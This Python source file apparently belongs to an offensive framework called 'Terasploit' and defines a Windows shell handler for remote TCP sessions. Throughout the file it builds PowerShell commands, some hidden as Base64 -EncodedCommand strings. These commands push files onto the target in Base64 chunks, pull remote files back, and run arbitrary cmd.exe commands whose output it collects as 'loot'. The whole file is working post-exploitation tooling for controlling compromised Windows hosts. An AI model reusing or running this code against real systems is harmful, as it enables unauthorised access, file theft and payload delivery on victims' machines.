import base64
import os

from extension.shell.generic import GenericShell
from terasploit.ui.printf import error, info, success, warning
from terasploit.utils.exception import TerasploitShellError


class WindowsShell(GenericShell):
    """Windows (cmd.exe / PowerShell) interactive shell for TCP sessions."""

    PLATFORM_LABEL = "Windows"

    def _handle_user_input(self, raw):
        """Translate Windows aliases then delegate to GenericShell dispatch."""
        if raw == "clear":
            self._handle_raw_input(raw)
            return

        if raw.lower() == "cls":
            raw = "clear"

        super()._handle_user_input(raw)

    def cmd_upload(self, args):
        """Upload a file to Windows by decoding a Base64 stream via PowerShell."""
        if len(args) < 2:
            warning("Usage: upload <local_path> <remote_path>")
            return

        local_path, remote_path = args[0], args[1]
        if not os.path.isfile(local_path):
            error(f"Source file not found: {local_path}")
            return

        chunk_size = 8192
        try:
            with open(local_path, "rb") as f:
                raw = f.read()

            safe_path = remote_path.replace("'", "''")
            total_chunks = (len(raw) + chunk_size - 1) // chunk_size
            info(f"Uploading {len(raw)} bytes to {remote_path} ({total_chunks} chunk(s))...")

            for idx in range(total_chunks):
                chunk_b64 = base64.b64encode(raw[idx * chunk_size : (idx + 1) * chunk_size]).decode("utf-8")

                if idx == 0:
                    ps_cmd = (
                        f'powershell -NoProfile -Command "'
                        f"[System.IO.File]::WriteAllBytes('{safe_path}', "
                        f"[System.Convert]::FromBase64String('{chunk_b64}'))\""
                    )
                else:
                    ps_cmd = (
                        f'powershell -NoProfile -Command "'
                        f"$f = [System.IO.File]::Open('{safe_path}', "
                        f"[System.IO.FileMode]::Append); "
                        f"$b = [System.Convert]::FromBase64String('{chunk_b64}'); "
                        f'$f.Write($b, 0, $b.Length); $f.Close()"'
                    )
                self._send(ps_cmd)

            success(f"Upload complete ({len(raw)} bytes, {total_chunks} chunk(s)).")

        except TerasploitShellError as exc:
            error(f"Upload failed: {exc}")

    def cmd_download(self, args):
        """Download a file from Windows using a PowerShell Base64 envelope."""
        if not args:
            warning("Usage: download <remote_path> [local_path]")
            return

        remote_path = args[0]
        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)

        info(f"Initiating download: {remote_path} → {local_path}")

        if not self._start_transfer(local_path):
            return

        safe_path = remote_path.replace("'", "''")
        ps_cmd = (
            f'powershell -NoProfile -Command "'
            f"$content = [System.IO.File]::ReadAllBytes('{safe_path}'); "
            f"Write-Host ('---TERASPLOIT_' + 'SHELL_SOF---'); "
            f"[System.Convert]::ToBase64String($content); "
            f"Write-Host ('---TERASPLOIT_' + 'SHELL_EOF---')\""
        )
        if not self._send(ps_cmd):
            self._stop_transfer()

    def _build_remote_file_cmd(self, remote_path):
        """Build a PowerShell command that transfers an existing remote file."""
        script = (
            f"$path = '{remote_path.replace(chr(39), chr(39) * 2)}'; "
            "try { "
            "$bytes = [System.IO.File]::ReadAllBytes($path); "
            "$status = 'OK'; $payload = [Convert]::ToBase64String($bytes) "
            "} catch { "
            "$status = 'ERR'; "
            "$payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_.Exception.Message)) "
            "}; "
            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_SOF---'); "
            "[Console]::Out.WriteLine($status); "
            "[Console]::Out.WriteLine($payload); "
            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_EOF---')"
        )
        encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
        return f"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand {encoded}"

    def _build_loot_cmd(self, remote_cmd: str) -> str:
        """Build a PowerShell command that captures Windows command output as Base64."""
        safe_cmd = remote_cmd.replace("'", "''")
        script = (
            f"$output = & cmd.exe /d /s /c '{safe_cmd}' 2>&1 | Out-String; "
            "$bytes = [System.Text.Encoding]::UTF8.GetBytes($output); "
            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_SOF---'); "
            "[Console]::Out.WriteLine([Convert]::ToBase64String($bytes)); "
            "[Console]::Out.WriteLine('---TERASPLOIT_SHELL_EOF---')"
        )
        encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
        return f"powershell.exe -NoLogo -NoProfile -NonInteractive -EncodedCommand {encoded}"
